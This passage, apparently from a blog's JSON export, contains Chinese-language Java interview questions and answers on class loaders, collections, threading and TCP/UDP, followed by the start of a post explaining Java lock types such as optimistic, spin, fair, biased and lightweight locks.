class=\"headerlink\" title=\"32、什么是双亲委派机制，介绍双亲委派的运作过程和好处\"></a>32、什么是双亲委派机制，介绍双亲委派的运作过程和好处</h4><p>双亲委派模式的工作原理是，如果一个类加载器收到了类加载请求，它并不会自己先去加载，而是把这个请求委托给父类的加载器去执行，如果父类加载器还存在其父类加载器，则进一步向上委托，依次递归，请求最终将到达顶层的启动类加载器。如果父加载器可以完成加载任务，就成功返回；如果如果父加载器无法完成加载任务，子加载器才会尝试自己去加载，这就是双亲委托模型。</p>\n<p>采用双亲委派模型的害处是Java类随着它的类加载器一起具备了一种带有优先级的层次关系，通过这种层级关系可以避免类的重复加载，当父亲已经加载了该类时，就没有必要子ClassLoader再加载一次。其次是考虑到安全因素，java核心api中定义类型不会随意被替换，比如通过网络传递一个java.lang.Integer的类，通过双亲委派模型传递到父类加载器，而启动类加载器在核心Java API中已经发现了这个类，所以并不会加载网络传递过来的Java.lang.Integer，而是直接返回已经加载过的Integer，这样便可以防止核心API被人随意篡改。</p>\n<h4 id=\"33、什么情况下需要破坏双亲委派机制\"><a href=\"#33、什么情况下需要破坏双亲委派机制\" class=\"headerlink\" title=\"33、什么情况下需要破坏双亲委派机制\"></a>33、什么情况下需要破坏双亲委派机制</h4><p>1、基础类调用用户代码</p>\n<p>双亲委派很好地解决了各个类加载器的基础类的同一问题（越基础的类由越上层的加载器进行加载），基础类之所以称为“基础”，是因为它们总是作为被用户代码调用的API，但世事往往没有绝对的完美。如果基础类又要调用回用户的代码，那该么办？一个典型的例子就是JNDI服务，JNDI服务现在已经是Java的标准服务。JNDI的目的是对资源进行集中管理和查找，但是它需要调用有独立厂商实现并部署在应用程序ClassPath下的JNDI接口提供者（如mysql连接驱动、sql连接驱动）的代码，但是启动类加载器不识别这些代码。</p>\n<p>为了解决这个问题，Java设计团队引入了一个不太优雅的设计：线程上下文类加载器（Thread Context ClassLoader）。有了线程上下文类加载器，JNDI就可以使用它去加载所需要的SPI代码，也就是父类加载器请求子类加载器去完成类加载的动作，这种行为实际上打破了双薪委派模型层次结构来逆向使用类加载器。JAVA中所有涉及SPI的加载动作基本上都是采用这种方式，例如JNDI、JDBC、JCE、JAXB等。</p>\n<p>2、OSGi模块化热部署</p>\n<p>OSGI实现模块化热部署的关键是它自定义的类加载器机制的实现，每一个程序模块都有一个自己的类加载器，当需要等换一个模块时，就把模块连同类加载器一起换掉以实现代码的热替换。</p>\n<h4 id=\"34、常见的JVM调优方法有哪些？可以调整哪个参数，调成什么值。\"><a href=\"#34、常见的JVM调优方法有哪些？可以调整哪个参数，调成什么值。\" class=\"headerlink\" title=\"34、常见的JVM调优方法有哪些？可以调整哪个参数，调成什么值。\"></a>34、常见的JVM调优方法有哪些？可以调整哪个参数，调成什么值。</h4><h4 id=\"35、红黑树的实现原理和应用场景\"><a href=\"#35、红黑树的实现原理和应用场景\" class=\"headerlink\" title=\"35、红黑树的实现原理和应用场景\"></a>35、红黑树的实现原理和应用场景</h4><h4 id=\"36、NIO是什么，适用于何种场景\"><a href=\"#36、NIO是什么，适用于何种场景\" class=\"headerlink\" title=\"36、NIO是什么，适用于何种场景\"></a>36、NIO是什么，适用于何种场景</h4><h4 id=\"37、八种基本数据类型的大小，以及他们的封装类\"><a href=\"#37、八种基本数据类型的大小，以及他们的封装类\" class=\"headerlink\" title=\"37、八种基本数据类型的大小，以及他们的封装类\"></a>37、八种基本数据类型的大小，以及他们的封装类</h4><p>byte、short、int、char、float、double、long、boolean<br>1、2、4、2、4、8、8、1<br>Byte、Short、Integer、Character、Float、Double、Long、Boolean</p>\n<h4 id=\"38、引用数据类型\"><a href=\"#38、引用数据类型\" class=\"headerlink\" title=\"38、引用数据类型\"></a>38、引用数据类型</h4><p>类、接口类型、数组类型、枚举类型、注解类型</p>\n<p>基本数据类型在创建时，在栈上给其划分一块内存，将数值直接存储在栈上。<br>引用数据类型在创建时，首先在栈上给其引用分配一块内存，而对象的具体信息都存储在堆内存中，然后由栈上的引用指向堆中对象的地址。</p>\n<h4 id=\"39、switch能否用string做参数\"><a href=\"#39、switch能否用string做参数\" class=\"headerlink\" title=\"39、switch能否用string做参数\"></a>39、switch能否用string做参数</h4><p>jdk7之前只能用byte、short、char、int这几个基本数据类型和其对应的封装类型。switch后面的括号内只能放置int类型的数据，由于byte、short、char都可以自动转为int类型，所以可以支持。</p>\n<p>jdk7之后整形、枚举类型、字符串都可以，但是jdk7并没有新的指令处理switch string，而是通过string.hashcode，将string转换为int进行判断。</p>\n<h4 id=\"40、equals和-的区别\"><a href=\"#40、equals和-的区别\" class=\"headerlink\" title=\"40、equals和==的区别\"></a>40、equals和==的区别</h4><p>1、使用==比较原生类型如 boolean、int、char等，使用equals比较对象<br>2、==是判断两个变量或者实例是不是指向同一个内存空间。equals是判断两个变量或者实例所指向的内存空间的值是不是相同<br>3、==是指对内存地址进行比较，equals是对字符串的内容进行比较<br>4、==是指引用是否相同，equals指的是值是否相同。</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1、HashMap和HashTable区别\"><a href=\"#1、HashMap和HashTable区别\" class=\"headerlink\" title=\"1、HashMap和HashTable区别\"></a>1、HashMap和HashTable区别</h4><p>HashMap是HashTable的轻量实现（非线程安全），他们都实现的Map接口，主要区别在于：线程安全，同步，性能</p>\n<ul>\n<li>HashTable继承Dictionary，HashMap继承的是java2出现的Map接口；</li>\n<li>HashMap允许将null作为key或value，hashtable不允许；</li>\n<li>HashMap是非同步的，HashTable是同步的(synchronized),所以HashMap线程不安全，而HashTable是线程安全的，多个线程可以共享一个HashTbale而不需要为自己的方法实现同步。Java5提供了ConcurrentMap，用来替代HashTable，比HashTable扩展性好；</li>\n<li>由于HashMap是非线程安全的，所以单一线程访问，HashMap性能要高于HashTable；</li>\n<li>HashMap的迭代器（Iterator）是fail-fast迭代器，HashTable的enumerator迭代器不是fail-fast的。</li>\n<li>HashMap把HashTable的contains方法去掉了，换成了containsValue和containsKey</li>\n<li>HashTable中数组默认大小是11，扩容方法是old*2+1;HashMap默认大小是16，扩容每次为2的指数大小</li>\n</ul>\n<h4 id=\"2、Object的hashcode方法，equals方法，常用的地方\"><a href=\"#2、Object的hashcode方法，equals方法，常用的地方\" class=\"headerlink\" title=\"2、Object的hashcode方法，equals方法，常用的地方\"></a>2、Object的hashcode方法，equals方法，常用的地方</h4><h4 id=\"3、HashMap的原理应用场景\"><a href=\"#3、HashMap的原理应用场景\" class=\"headerlink\" title=\"3、HashMap的原理应用场景\"></a>3、HashMap的原理应用场景</h4><p>简单的说，HashMap是由数组和链表组成的，主体是数组，链表的作用主要是为了解决哈希冲突而存在的。在JDK1.8之后，链表长度超过8之后，会转换为红黑树。HashMap的默认容量为16，阈值为0.75，总容量超过0.75时，会进行2倍扩容。</p>\n<h4 id=\"4、JDK中有哪些线程池\"><a href=\"#4、JDK中有哪些线程池\" class=\"headerlink\" title=\"4、JDK中有哪些线程池\"></a>4、JDK中有哪些线程池</h4><p>Java中通过Executors提供四种线程池：</p>\n<ul>\n<li>newCachedTheadPool： 创建一个可缓存的线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无回收，则创建线程。此线程池不会对线程池大小做限制，线程池大小完全依赖系统能够创建的最大线程大小。</li>\n<li>newFixedThreadPool： 创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待</li>\n<li>newScheduleThreadPool： 创建一个定长线程池，支持定时及周期性任务执行</li>\n<li>newSingleThreadExecutor： 创建一个单线程化的线程池，他只会用唯一的工作线程来执行任务，保证所有任务按照先定顺序（FIFO，LIFO优先级执行）</li>\n</ul>\n<h4 id=\"5、TCP-UDP区别\"><a href=\"#5、TCP-UDP区别\" class=\"headerlink\" title=\"5、TCP/UDP区别\"></a>5、TCP/UDP区别</h4><p><strong>相同点</strong>： 都处于OSI七层模型的网络层，都是传输层协议，都能保护网络层的传输，双方通信都需要开放端口。</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>TCP</th>\n<th>UDP</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>Transmission Control Protocol 传输控制协议</td>\n<td>User Data Protocol 用户数据报协议</td>\n</tr>\n<tr>\n<td>2</td>\n<td>TCP的传输是可靠传输</td>\n<td>UDP的传输是不可靠传输</td>\n</tr>\n<tr>\n<td>3</td>\n<td>TCP是基于连接的协议，在正式收发数据前，必须和对方建立可靠的连接</td>\n<td>UDP是和TCP相对应的协议，他是面向非连接的协议，他不与对方建立连接，而是直接把数据包发送出去</td>\n</tr>\n<tr>\n<td>4</td>\n<td>TCP是一种可靠的通信服务，负载相对而言比较大，TCP用套接字(socket)或者端口进行通信</td>\n<td>UDP是一种不可靠的网络服务，负载相对较小</td>\n</tr>\n<tr>\n<td>5</td>\n<td>TCP和UP的结构不同，TCP包括序号、确认信号、数据偏移、控制标志(通常URG、ACK、PSH、RST、SYN、FIN)、窗口、检验和、紧急指针、选项等信息</td>\n<td>UDP包含长度和检验和信息</td>\n</tr>\n<tr>\n<td>6</td>\n<td>TCP提供超时重发，丢弃重复数据，检验数据，流量控制等，保证数据从一端传到另一端</td>\n<td>UDP不提供可靠性，他只是把应用程序传给IP层的数据发送出去，但是不能保证他们到达目的端</td>\n</tr>\n<tr>\n<td>7</td>\n<td>TCP发送数据包前会在通信双方间建立三次握手，确保双方准备好，在传输数据包期间，TCP会根据链路中数据流量的大小来调节传送的速率，传输时如果发现有丢包，会有严格的重传机制，故而传输速度很慢</td>\n<td>UDP在传输数据报前不用在客户端和服务器之间建立连接，且没有超时重发机制，故而传输速度很快</td>\n</tr>\n<tr>\n<td>8</td>\n<td>TCP支持全双工和并发的TCP连接，提供确认、重传、拥塞控制</td>\n<td>UDP适用于对系统性能要求高于数据完整性的要求，需要简短快捷的数据交换、需要多播和广播的应用环境</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"6、查找一个数组的中位数\"><a href=\"#6、查找一个数组的中位数\" class=\"headerlink\" title=\"6、查找一个数组的中位数\"></a>6、查找一个数组的中位数</h4><h4 id=\"7、反射的机制，说说反射的用途和实现，反射是不是很慢，我们在项目中是否应该避免使用反射。\"><a href=\"#7、反射的机制，说说反射的用途和实现，反射是不是很慢，我们在项目中是否应该避免使用反射。\" class=\"headerlink\" title=\"7、反射的机制，说说反射的用途和实现，反射是不是很慢，我们在项目中是否应该避免使用反射。\"></a>7、反射的机制，说说反射的用途和实现，反射是不是很慢，我们在项目中是否应该避免使用反射。</h4><h4 id=\"8、Object类中的方法\"><a href=\"#8、Object类中的方法\" class=\"headerlink\" title=\"8、Object类中的方法\"></a>8、Object类中的方法</h4><h4 id=\"9、对象比较是否相等\"><a href=\"#9、对象比较是否相等\" class=\"headerlink\" title=\"9、对象比较是否相等\"></a>9、对象比较是否相等</h4><h4 id=\"10、toString方法的常用地方，为什么要重写该方法\"><a href=\"#10、toString方法的常用地方，为什么要重写该方法\" class=\"headerlink\" title=\"10、toString方法的常用地方，为什么要重写该方法\"></a>10、toString方法的常用地方，为什么要重写该方法</h4><h4 id=\"11、HashMap-put方法怎么判断是否是重复方法\"><a href=\"#11、HashMap-put方法怎么判断是否是重复方法\" class=\"headerlink\" title=\"11、HashMap put方法怎么判断是否是重复方法\"></a>11、HashMap put方法怎么判断是否是重复方法</h4><h4 id=\"12、Set和List的区别\"><a href=\"#12、Set和List的区别\" class=\"headerlink\" title=\"12、Set和List的区别\"></a>12、Set和List的区别</h4><h4 id=\"13、ArrayList和LinkedList的区别，List和Map的区别，-ArrayList和Vector的区别\"><a href=\"#13、ArrayList和LinkedList的区别，List和Map的区别，-ArrayList和Vector的区别\" class=\"headerlink\" title=\"13、ArrayList和LinkedList的区别，List和Map的区别， ArrayList和Vector的区别\"></a>13、ArrayList和LinkedList的区别，List和Map的区别， ArrayList和Vector的区别</h4><ul>\n<li>ArrayList和LinkedList区别：<ul>\n<li>ArrayList内部是基于数组实现的，因此对于随机访问快，新增删除慢</li>\n<li>LinkedList内部是基于链表实现的，因此新增删除快，随机访问慢。</li>\n</ul>\n</li>\n<li>List和Map的区别：<ul>\n<li>List是存储单列数据的集合，存储的数据都是有序并且是可以重复的</li>\n<li>Map是存储双列数据的集合，通过键值对存储数据，存储的数据是无序的，Key值不能重复，value值是可以重复的。</li>\n</ul>\n</li>\n<li>ArrayList和Vector的区别：<ul>\n<li>ArrayList是不同步的，也就是不是线程安全的类</li>\n<li>Vector是同步的，线程安全</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"14、TreeSet对存入的数据有什么要求吗？\"><a href=\"#14、TreeSet对存入的数据有什么要求吗？\" class=\"headerlink\" title=\"14、TreeSet对存入的数据有什么要求吗？\"></a>14、TreeSet对存入的数据有什么要求吗？</h4><h4 id=\"15、HashSet是不是线程安全的\"><a href=\"#15、HashSet是不是线程安全的\" class=\"headerlink\" title=\"15、HashSet是不是线程安全的\"></a>15、HashSet是不是线程安全的</h4><h4 id=\"16、Java中有哪些线程安全的Map\"><a href=\"#16、Java中有哪些线程安全的Map\" class=\"headerlink\" title=\"16、Java中有哪些线程安全的Map\"></a>16、Java中有哪些线程安全的Map</h4><h4 id=\"17、CocurrentHashMap是怎么做到线程安全的\"><a href=\"#17、CocurrentHashMap是怎么做到线程安全的\" class=\"headerlink\" title=\"17、CocurrentHashMap是怎么做到线程安全的\"></a>17、CocurrentHashMap是怎么做到线程安全的</h4><h4 id=\"18、如何保证线程安全问题\"><a href=\"#18、如何保证线程安全问题\" class=\"headerlink\" title=\"18、如何保证线程安全问题\"></a>18、如何保证线程安全问题</h4><h4 id=\"19、volatile原子性问题？为什么i-不支持原子性\"><a href=\"#19、volatile原子性问题？为什么i-不支持原子性\" class=\"headerlink\" title=\"19、volatile原子性问题？为什么i++不支持原子性\"></a>19、volatile原子性问题？为什么i++不支持原子性</h4><h4 id=\"20、CAS操作\"><a href=\"#20、CAS操作\" class=\"headerlink\" title=\"20、CAS操作\"></a>20、CAS操作</h4><h4 id=\"21、lock和synchronized区别\"><a href=\"#21、lock和synchronized区别\" class=\"headerlink\" title=\"21、lock和synchronized区别\"></a>21、lock和synchronized区别</h4><h4 id=\"22、公平锁和非公平锁\"><a href=\"#22、公平锁和非公平锁\" class=\"headerlink\" title=\"22、公平锁和非公平锁\"></a>22、公平锁和非公平锁</h4><h4 id=\"23、Java读写锁，读写锁解决的问题\"><a href=\"#23、Java读写锁，读写锁解决的问题\" class=\"headerlink\" title=\"23、Java读写锁，读写锁解决的问题\"></a>23、Java读写锁，读写锁解决的问题</h4><h4 id=\"24、线程池的原理，为什么要创建线程池？创建线程池的方式？\"><a href=\"#24、线程池的原理，为什么要创建线程池？创建线程池的方式？\" class=\"headerlink\" title=\"24、线程池的原理，为什么要创建线程池？创建线程池的方式？\"></a>24、线程池的原理，为什么要创建线程池？创建线程池的方式？</h4><p>使用线程池的好处： 线程可以重复利用，减少创建、销毁线程带来的系统资源的开销，提高性能</p>\n<h4 id=\"25、线程的生命周期，什么时候会出现僵死进程？\"><a href=\"#25、线程的生命周期，什么时候会出现僵死进程？\" class=\"headerlink\" title=\"25、线程的生命周期，什么时候会出现僵死进程？\"></a>25、线程的生命周期，什么时候会出现僵死进程？</h4><h4 id=\"26、创建线程池有哪几个核心参数，如何合理配置线程池的大小？\"><a href=\"#26、创建线程池有哪几个核心参数，如何合理配置线程池的大小？\" class=\"headerlink\" title=\"26、创建线程池有哪几个核心参数，如何合理配置线程池的大小？\"></a>26、创建线程池有哪几个核心参数，如何合理配置线程池的大小？</h4><h4 id=\"27、volatile、ThreadLocal的使用场景和原理\"><a href=\"#27、volatile、ThreadLocal的使用场景和原理\" class=\"headerlink\" title=\"27、volatile、ThreadLocal的使用场景和原理\"></a>27、volatile、ThreadLocal的使用场景和原理</h4><h4 id=\"28、Synchronized、Volatile区别，Synchronized锁粒度，模拟死锁场景、原子性与可见性。\"><a href=\"#28、Synchronized、Volatile区别，Synchronized锁粒度，模拟死锁场景、原子性与可见性。\" class=\"headerlink\" title=\"28、Synchronized、Volatile区别，Synchronized锁粒度，模拟死锁场景、原子性与可见性。\"></a>28、Synchronized、Volatile区别，Synchronized锁粒度，模拟死锁场景、原子性与可见性。</h4><h4 id=\"29、JVM内存模型、GC机制和原理\"><a href=\"#29、JVM内存模型、GC机制和原理\" class=\"headerlink\" title=\"29、JVM内存模型、GC机制和原理\"></a>29、JVM内存模型、GC机制和原理</h4><h4 id=\"30、GC分那两种，Minor-GC和Full-GC有什么区别，什么情况下会触发Full-GC，分别采用什么算法。\"><a href=\"#30、GC分那两种，Minor-GC和Full-GC有什么区别，什么情况下会触发Full-GC，分别采用什么算法。\" class=\"headerlink\" title=\"30、GC分那两种，Minor GC和Full GC有什么区别，什么情况下会触发Full GC，分别采用什么算法。\"></a>30、GC分那两种，Minor GC和Full GC有什么区别，什么情况下会触发Full GC，分别采用什么算法。</h4><h4 id=\"31、JVM里有几种classloader，为什么会有多种。\"><a href=\"#31、JVM里有几种classloader，为什么会有多种。\" class=\"headerlink\" title=\"31、JVM里有几种classloader，为什么会有多种。\"></a>31、JVM里有几种classloader，为什么会有多种。</h4><p>JVM里有三种类加载器：BootStrap Loader 负责加载系统类，ExtClassLoader负责加载扩展类，AppClassLoader负责加载应用类。</p>\n<p>他们的分工不一样，各自负责不同的区域，另外也是为了实现委托模型。</p>\n<p>当执行java *.class的时候，java会帮助我们找到jre，接着找到jre内部的jvm.dll，这个才是真正的java虚拟机，最后加载动态库，激活java虚拟机。虚拟机激活后，会先做一些初始化的动作，比如读取系统参数，一旦初始化动作完成，就会产生第一个类加载器-Bootstrap Loader，Bootstrap Loader是由C++编写的，该Loader所做的初始化工作中，除了一些基本的初始化动作之外，最重要的就是加载Launcher.java中的ExtClassLoader，并设定其parent为null，但其实其父加载器就是Bootstrap Loader。然后Bootstrap Loader在要求加载Launcher.java中的AppClassLoader，并设定其Parent为ExtClassLoader。需要注意的是Launcher$ExtClassLoader和Launcher$AppClassLoader都是由BootstrapLoader加载的，所以Parent和由哪个类加载没有关系。</p>\n<h4 id=\"32、什么是双亲委派机制，介绍双亲委派的运作过程和好处\"><a href=\"#32、什么是双亲委派机制，介绍双亲委派的运作过程和好处\" class=\"headerlink\" title=\"32、什么是双亲委派机制，介绍双亲委派的运作过程和好处\"></a>32、什么是双亲委派机制，介绍双亲委派的运作过程和好处</h4><p>双亲委派模式的工作原理是，如果一个类加载器收到了类加载请求，它并不会自己先去加载，而是把这个请求委托给父类的加载器去执行，如果父类加载器还存在其父类加载器，则进一步向上委托，依次递归，请求最终将到达顶层的启动类加载器。如果父加载器可以完成加载任务，就成功返回；如果如果父加载器无法完成加载任务，子加载器才会尝试自己去加载，这就是双亲委托模型。</p>\n<p>采用双亲委派模型的害处是Java类随着它的类加载器一起具备了一种带有优先级的层次关系，通过这种层级关系可以避免类的重复加载，当父亲已经加载了该类时，就没有必要子ClassLoader再加载一次。其次是考虑到安全因素，java核心api中定义类型不会随意被替换，比如通过网络传递一个java.lang.Integer的类，通过双亲委派模型传递到父类加载器，而启动类加载器在核心Java API中已经发现了这个类，所以并不会加载网络传递过来的Java.lang.Integer，而是直接返回已经加载过的Integer，这样便可以防止核心API被人随意篡改。</p>\n<h4 id=\"33、什么情况下需要破坏双亲委派机制\"><a href=\"#33、什么情况下需要破坏双亲委派机制\" class=\"headerlink\" title=\"33、什么情况下需要破坏双亲委派机制\"></a>33、什么情况下需要破坏双亲委派机制</h4><p>1、基础类调用用户代码</p>\n<p>双亲委派很好地解决了各个类加载器的基础类的同一问题（越基础的类由越上层的加载器进行加载），基础类之所以称为“基础”，是因为它们总是作为被用户代码调用的API，但世事往往没有绝对的完美。如果基础类又要调用回用户的代码，那该么办？一个典型的例子就是JNDI服务，JNDI服务现在已经是Java的标准服务。JNDI的目的是对资源进行集中管理和查找，但是它需要调用有独立厂商实现并部署在应用程序ClassPath下的JNDI接口提供者（如mysql连接驱动、sql连接驱动）的代码，但是启动类加载器不识别这些代码。</p>\n<p>为了解决这个问题，Java设计团队引入了一个不太优雅的设计：线程上下文类加载器（Thread Context ClassLoader）。有了线程上下文类加载器，JNDI就可以使用它去加载所需要的SPI代码，也就是父类加载器请求子类加载器去完成类加载的动作，这种行为实际上打破了双薪委派模型层次结构来逆向使用类加载器。JAVA中所有涉及SPI的加载动作基本上都是采用这种方式，例如JNDI、JDBC、JCE、JAXB等。</p>\n<p>2、OSGi模块化热部署</p>\n<p>OSGI实现模块化热部署的关键是它自定义的类加载器机制的实现，每一个程序模块都有一个自己的类加载器，当需要等换一个模块时，就把模块连同类加载器一起换掉以实现代码的热替换。</p>\n<h4 id=\"34、常见的JVM调优方法有哪些？可以调整哪个参数，调成什么值。\"><a href=\"#34、常见的JVM调优方法有哪些？可以调整哪个参数，调成什么值。\" class=\"headerlink\" title=\"34、常见的JVM调优方法有哪些？可以调整哪个参数，调成什么值。\"></a>34、常见的JVM调优方法有哪些？可以调整哪个参数，调成什么值。</h4><h4 id=\"35、红黑树的实现原理和应用场景\"><a href=\"#35、红黑树的实现原理和应用场景\" class=\"headerlink\" title=\"35、红黑树的实现原理和应用场景\"></a>35、红黑树的实现原理和应用场景</h4><h4 id=\"36、NIO是什么，适用于何种场景\"><a href=\"#36、NIO是什么，适用于何种场景\" class=\"headerlink\" title=\"36、NIO是什么，适用于何种场景\"></a>36、NIO是什么，适用于何种场景</h4><h4 id=\"37、八种基本数据类型的大小，以及他们的封装类\"><a href=\"#37、八种基本数据类型的大小，以及他们的封装类\" class=\"headerlink\" title=\"37、八种基本数据类型的大小，以及他们的封装类\"></a>37、八种基本数据类型的大小，以及他们的封装类</h4><p>byte、short、int、char、float、double、long、boolean<br>1、2、4、2、4、8、8、1<br>Byte、Short、Integer、Character、Float、Double、Long、Boolean</p>\n<h4 id=\"38、引用数据类型\"><a href=\"#38、引用数据类型\" class=\"headerlink\" title=\"38、引用数据类型\"></a>38、引用数据类型</h4><p>类、接口类型、数组类型、枚举类型、注解类型</p>\n<p>基本数据类型在创建时，在栈上给其划分一块内存，将数值直接存储在栈上。<br>引用数据类型在创建时，首先在栈上给其引用分配一块内存，而对象的具体信息都存储在堆内存中，然后由栈上的引用指向堆中对象的地址。</p>\n<h4 id=\"39、switch能否用string做参数\"><a href=\"#39、switch能否用string做参数\" class=\"headerlink\" title=\"39、switch能否用string做参数\"></a>39、switch能否用string做参数</h4><p>jdk7之前只能用byte、short、char、int这几个基本数据类型和其对应的封装类型。switch后面的括号内只能放置int类型的数据，由于byte、short、char都可以自动转为int类型，所以可以支持。</p>\n<p>jdk7之后整形、枚举类型、字符串都可以，但是jdk7并没有新的指令处理switch string，而是通过string.hashcode，将string转换为int进行判断。</p>\n<h4 id=\"40、equals和-的区别\"><a href=\"#40、equals和-的区别\" class=\"headerlink\" title=\"40、equals和==的区别\"></a>40、equals和==的区别</h4><p>1、使用==比较原生类型如 boolean、int、char等，使用equals比较对象<br>2、==是判断两个变量或者实例是不是指向同一个内存空间。equals是判断两个变量或者实例所指向的内存空间的值是不是相同<br>3、==是指对内存地址进行比较，equals是对字符串的内容进行比较<br>4、==是指引用是否相同，equals指的是值是否相同。</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"java中的各种锁","date":"2018-11-28T08:17:48.000Z","_content":"\n\n## 一、 Java中锁的分类\n\n### 乐观锁\n\n乐观锁是一种思想，即认为读多写少，遇到并发写的可能性低，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据，采取在写时先读出版本号，然后加锁操作（比较跟上一次的版本号，如果一样则更新），如果失败则重复读-比较-写的操作。\n\njava中乐观锁基本都是通过CAS(Compare And Swap)实现的，CAS是一种更新的原子操作，比较当前的值和传入的值是否一样，一样则更新，否则失败。\n\n### 悲观锁\n\n悲观锁就是悲观思想，认为写多，遇到并发的可能性高，每次去拿数据的时候都认为别人会修改，所以每次在读写数据的时候都会先上锁。这样别人想读取数据就会直接block拿到锁，java中的悲观锁就是synchronized，AQS框架下的锁则是先尝试CAS乐观锁去获取锁，获取不到，才会转为悲观锁，如RetreenLock。\n\n### 自旋锁\n\n自旋锁的原理非常简单，如果持有锁的线程能在很短时间内释放资源，那么等待竞争锁的线程就不需要做内核态和用户态之间的切换进入阻塞状态，他们只需要等一等（自旋），等持有锁的线程释放锁后即可立即获取锁，这样就避免用户线程和内核的切换消耗。\n\n线程自旋是需要消耗CPU的，说白了就是再让CPU做无用功，如果一直获取不到锁，那县城也不能一直占用CPU自旋锁做无用功，所以需要设定一个最大自旋等待时间。\n\n如果持有锁的线程执行时间查过自旋等待的最大时间仍然没有释放锁，就会导致其他争用锁的线程在最大时间还是获取不到锁，这是争用线程会停止自旋进入阻塞状态。\n\n### 非公平锁\n\nJVM按照随机、就近原则分配锁的机制则称为不公平锁。非公平锁是指多个线程获取锁的顺序并不是按照申请的顺序，有可能后申请的线程比先申请的线程先获得锁。\n\n在java中，ReentrantLock可以通过构造函数指定该锁是公平锁还是非公平锁，默认是非公平锁。非公平锁实际执行效率要远远超出公平锁，因此除非有特殊需要，否则最常用的还是非公平锁的分配机制。\n\n对于synchronized而言，是一种非公平锁，由于其并不想ReentrantLock是通过AQS框架实现的线程调度，所有没有任何办法使其变为公平锁。\n\n### 公平锁\n\n与非公平锁相对，公平锁是按照线程申请的顺序进行锁的分配。通常先对锁获取请求的线程会先被分配到锁。由于公平锁会维护一个线程队列，因此相比非公平锁性能会下降5-10倍。\n\n### 可重入锁（递归锁）\n\n可重入锁又称递归锁，是指在一个线程的外层方法回去锁之后，在进入内层方法时会自动回去锁。在java中，ReentrantLock和Synchronized都是可重入锁。\n\n### ReadWriteLock 读写锁\n\n为了提高性能，Java中提供了读写锁，在读的地方用读锁，在写的地方用写锁，灵活控制，在没有写锁的情况下，读是无阻塞的，在一定情况下提高了程序的运行效率。读写锁分为读锁和写锁，多个读锁不互斥，读锁和写锁互斥，这是由jvm控制的，你只要上好相应的锁即可。\n\nJava中读写锁有个接口java.util.concurrent.locks.ReadWriteLock，也有具体的实现ReentrantReadWriteLock。\n\n### 共享锁和独占锁\n\njava并发包中提供的加锁模式分别为共享锁和独占锁。\n\n**1、独占锁**\n\n独占锁模式下，只有一个线程持有锁，ReentrantLock就是以独占锁实现的互斥锁。独占锁是一种悲观保守的加锁策略，他避免了读/读冲突，如果某个只读线程获取了锁，则其他读线程都只能等待，这种情况下就限制了不必要的并发性，应为读操作并不会影响数据的一致性。\n\n**2、共享锁**\n\n共享锁允许多个线程同时获得锁，并发访问共享资源，如：ReadWriteLock。共享锁是一种乐观锁，他放宽了加锁策略，允许多个执行读操作的线程同时访问共享资源。\n\nAQS内部类Node定义了两个常量SHARED和EXCLUSIVE，他们分别表示了AQS队列中等待线程获取锁的模式。\n\n### 重量级锁\n\nSynchronized是通过对象内部的一个叫做监视器锁（monitor）来实现的。但是监视器锁本质又是依赖于底层的操作系统的MutexLock实现的，而操作系统实现线程之间的切换这就需要从用户态转换为核心态，这个成本非常高，状态之间的转换需要相对比较长的时间，这就是为什么Synchronized效率低的原因。因此这种依赖于操作系统Mutex Lock实现的锁我们称之为“重量级锁”，JDK中对于Synchronized的优化，其核心就是为了减少这种重量级锁的使用。JDK1.6之后，为了减少锁和释放锁所带来的性能消耗，提高性能，引入了“轻量级锁”和“偏向锁”。\n\n### 轻量级锁\n\n锁的状态有四种：无锁状态、偏向锁、轻量级锁、重量级锁。\n\n随着锁的竞争，锁可以从偏向锁升级到轻量级锁，再升级到重量级锁。但是锁升级只能是单向的，也就是说只能从低到高，不会出现锁的降级。\n\n“轻量级锁”是相对于使用系统互斥量来实现的传统锁而言的，但是首先要强调一点的是，轻量级锁并不是用来代替重量级锁的，他的本意是在没有多线程竞争的前提下，减少传统的重量级锁产生的性能消耗。在解释轻量级锁的执行过程之前，先明白一点，轻量级锁所适应的场景是线程交替执行同步代码块的情况，如果存在同一时间访问统一锁的情况，就会导致轻量级锁膨胀为重量级锁。\n\n### 偏向锁\n\nHotspot的作者经过大量研究发现大多数情况下锁不仅不会存在多线程竞争，而且总是由同一个线程多次获取。偏向锁的目的是在某个线程获得锁之后，消除这个线程锁重入（CAS）的开销，看起来像是让这个线程得到了偏护。引入偏向锁的目的是为了在无多线程竞争条件下尽量减少不必要的轻量级锁执行路径，应为轻量级锁的获取和释放依赖多次CAS原子指令，而偏向锁只需要在置换ThreadID的时候依赖一次CAS原子指令（由于一旦出现多线程竞争的情况就必须撤销偏向锁，所以偏向锁的撤销消耗的性能必须小于节省下来的CAS原子指令的性能消耗）。上面说过，轻量级锁是为了在线程交替执行同步块的时候提高性能，而偏向锁则是在只有一个线程执行同步快时进一步提高性能。\n\n### 分段锁\n\n分段锁是一种设计，并不是具体的一种锁。在ConcurrentHashMap中，其并发的思想就是通过分段所的形式来实现高效的并发操作。\n\n\n\n## 二、 JAVA中几种锁的实现\n\n### 1、Synchronized 同步锁\n\nsynchronized 